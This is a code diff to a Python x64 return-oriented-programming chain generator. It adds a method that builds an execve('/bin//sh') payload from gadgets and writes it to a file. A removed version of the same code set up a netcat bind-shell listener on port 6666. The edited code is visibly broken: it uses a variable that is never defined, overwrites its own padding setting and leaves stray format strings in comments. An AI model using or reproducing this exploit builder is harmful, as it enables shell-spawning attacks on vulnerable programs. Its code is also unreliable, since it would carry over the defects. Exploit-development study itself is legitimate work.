@@ -13,12 +13,13 @@ from struct import pack
 
 
 class ROPMakerX64(object):
-    def __init__(self, binary, gadgets, liboffset=0x0):
+    def __init__(self, binary, gadgets,padding, liboffset=0x0):
         self.__binary  = binary
         self.__gadgets = gadgets
 
         # If it's a library, we have the option to add an offset to the addresses
         self.__liboffset = liboffset
+        self.padding = padding
 
         self.__generate()
 
@@ -71,6 +72,17 @@ class ROPMakerX64(object):
                     print("\tp += pack('<Q', 0x%016x) # padding without overwrite %s" % (regAlreadSetted[reg], reg))
                 except KeyError:
                     print("\tp += pack('<Q', 0x4141414141414141) # padding")
+
+    def __custompadding(self, gadget, regAlreadSetted):
+        lg = gadget["gadget"].split(" ; ")
+        for g in lg[1:]:
+            if g.split()[0] == "pop":
+                reg = g.split()[1]
+                try:
+                    return pack('<Q', regAlreadSetted[reg])
+                except KeyError:
+                    return pack('<Q', 0x41414141)
+        return b''
 
     def __buildRopChain(self, write4where, popDst, popSrc, xorSrc, xorRax, incRax, popRdi, popRsi, popRdx, syscall):
 
@@ -132,7 +144,7 @@ class ROPMakerX64(object):
 
         print("p += pack('<Q', 0x%016x) # %s" % (syscall["vaddr"], syscall["gadget"]))
 
-    def customRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):
+    def customRopChain(self, write4where, popDst, popSrc, xorSrc, xorRax, incRax, popRdi, popRsi, popRdx, syscall):
     
         sects = self.__binary.getDataSections()
         dataAddr = None
@@ -144,16 +156,16 @@ class ROPMakerX64(object):
             return
 
         p = b'A' * self.padding
-        p = b'A' * 44
+        p = b'A' * 40
 
-        args = [b'/bin//nc',b'-lvp',b'6666']
+        args = [b'/bin//sh']
 
         stack = dataAddr
         #-----------------------------stack--------------------------
 
         for i in range(len(args)):
             arg = args[i]
-            chunk = len(arg) // 4        
+            chunk = len(arg) // 8        
             for j in range(chunk): 
                 
                 p += pack('<Q', popDst["vaddr"]) 
@@ -161,13 +173,13 @@ class ROPMakerX64(object):
                 p += self.__custompadding(popDst, {})
 
                 p += pack('<Q', popSrc["vaddr"]) 
-                p += arg[j*4:j*4+4] 
+                p += arg[j*8:j*8+8] 
                 p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: stack})  # Don't overwrite reg dst
 
                 p += pack('<Q', write4where["vaddr"]) 
                 p += self.__custompadding(write4where, {}) 
                 
-                stack = stack + 4
+                stack = stack + 8
 
                 #arg each in 4 chunk
 
@@ -192,76 +204,64 @@ class ROPMakerX64(object):
         for arg in args:
 
             p += pack('<Q', popDst["vaddr"]) 
-            p += pack('<I', stack) 
+            p += pack('<Q', stack) 
             p += self.__custompadding(popDst, {})
 
-            p += pack('<I', popSrc["vaddr"]) 
-            p += pack('<I', dataAddr + argindex) 
+            p += pack('<Q', popSrc["vaddr"]) 
+            p += pack('<Q', dataAddr + argindex) 
             p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: stack})  # Don't overwrite reg dst
 
-            p += pack('<I', write4where["vaddr"]) 
+            p += pack('<Q', write4where["vaddr"]) 
             p += self.__custompadding(write4where, {})        
 
-            stack = stack + 4
+            stack = stack + 8
             argindex = argindex + len(arg) + 1 
 
             #writes arg on shadowstack
         
-        p += pack('<I', popDst["vaddr"]) 
-        p += pack('<I', stack) 
+        p += pack('<Q', popDst["vaddr"]) 
+        p += pack('<Q', stack) 
         p += self.__custompadding(popDst, {})
 
-        p += pack('<I', xorSrc["vaddr"]) 
+        p += pack('<Q', xorSrc["vaddr"]) 
         p += self.__custompadding(xorSrc, {})
 
-        p += pack('<I', write4where["vaddr"]) 
+        p += pack('<Q', write4where["vaddr"]) 
         p += self.__custompadding(write4where, {})
 
         #adding null
 
-        p += pack('<y', popDst["vaddr"]) #popDst["gadget"]
-        p += pack('<Q', dataAddr) # @ .data" % dataAddr)
-        self.__padding(popDst, {})
-
-        print("p += pack('<Q', 0x%016x) # %s" % (popSrc["vaddr"], popSrc["gadget"]))
-        print("p += b'/bin//sh'")
-        self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr})  # Don't overwrite reg dst
-
-        print("p += pack('<Q', 0x%016x) # %s" % (write4where["vaddr"], write4where["gadget"]))
-        self.__padding(write4where, {})
-
-        print("p += pack('<Q', 0x%016x) # %s" % (popDst["vaddr"], popDst["gadget"]))
-        print("p += pack('<Q', 0x%016x) # @ .data + 8" % (dataAddr + 8))
-        self.__padding(popDst, {})
-
-        print("p += pack('<Q', 0x%016x) # %s" % (xorSrc["vaddr"], xorSrc["gadget"]))
-        self.__padding(xorSrc, {})
-
-        print("p += pack('<Q', 0x%016x) # %s" % (write4where["vaddr"], write4where["gadget"]))
-        self.__padding(write4where, {})
-
-        print("p += pack('<Q', 0x%016x) # %s" % (popRdi["vaddr"], popRdi["gadget"]))
-        print("p += pack('<Q', 0x%016x) # @ .data" % dataAddr)
+        p += pack('<Q', popRdi["vaddr"]) # %s" % (popRdi["vaddr"], popRdi["gadget"]))
+        p += pack('<Q', dataAddr)
         self.__padding(popRdi, {})
 
-        print("p += pack('<Q', 0x%016x) # %s" % (popRsi["vaddr"], popRsi["gadget"]))
-        print("p += pack('<Q', 0x%016x) # @ .data + 8" % (dataAddr + 8))
+        #puts stack in to rdi (program)
+
+        p += pack('<Q', popRsi["vaddr"]) # %s" % (popRsi["vaddr"], popRsi["gadget"]))
+        p += pack('<Q', safestack) # @ .data + 8" % (dataAddr + 8))
         self.__padding(popRsi, {"rdi": dataAddr})  # Don't overwrite rdi
+        
+        #puts safestack in to rsi (args)
 
-        print("p += pack('<Q', 0x%016x) # %s" % (popRdx["vaddr"], popRdx["gadget"]))
-        print("p += pack('<Q', 0x%016x) # @ .data + 8" % (dataAddr + 8))
-        self.__padding(popRdx, {"rdi": dataAddr, "rsi": dataAddr + 8})  # Don't overwrite rdi and rsi
+        p += pack('<Q', popRdx["vaddr"]) # %s" % (popRdx["vaddr"], popRdx["gadget"]))
+        p += pack('<Q', safestack) # @ .data + 8" % (dataAddr + 8))
+        self.__padding(popRdx, {"rdi": dataAddr, "rsi": safestack})  # Don't overwrite rdi and rsi
+        
+        #puts stack in to rdx (env)
 
-        print("p += pack('<Q', 0x%016x) # %s" % (xorRax["vaddr"], xorRax["gadget"]))
-        self.__padding(xorRax, {"rdi": dataAddr, "rsi": dataAddr + 8})  # Don't overwrite rdi and rsi
+        p += pack('<Q', xorRax["vaddr"]) # %s" % (xorRax["vaddr"], xorRax["gadget"]))
+        self.__padding(xorRax, {"rdi": dataAddr, "rsi": safestack})  # Don't overwrite rdi and rsi
 
         for _ in range(59):
-            print("p += pack('<Q', 0x%016x) # %s" % (incRax["vaddr"], incRax["gadget"]))
-            self.__padding(incRax, {"rdi": dataAddr, "rsi": dataAddr + 8})  # Don't overwrite rdi and rsi
+            p += pack('<Q', incRax["vaddr"]) # %s" % (incRax["vaddr"], incRax["gadget"]))
+            self.__padding(incRax, {"rdi": dataAddr, "rsi": safestack})  # Don't overwrite rdi and rsi
 
-        print("p += pack('<Q', 0x%016x) # %s" % (syscall["vaddr"], syscall["gadget"]))
+        p += pack('<Q', syscall["vaddr"]) # %s" % (syscall["vaddr"], syscall["gadget"]))
         
-
+        outputfile = open("paddingbruteforce", "wb")
+        outputfile.write(p)
+        outputfile.close() 
+        
     def __generate(self):
 
         # To find the smaller gadget
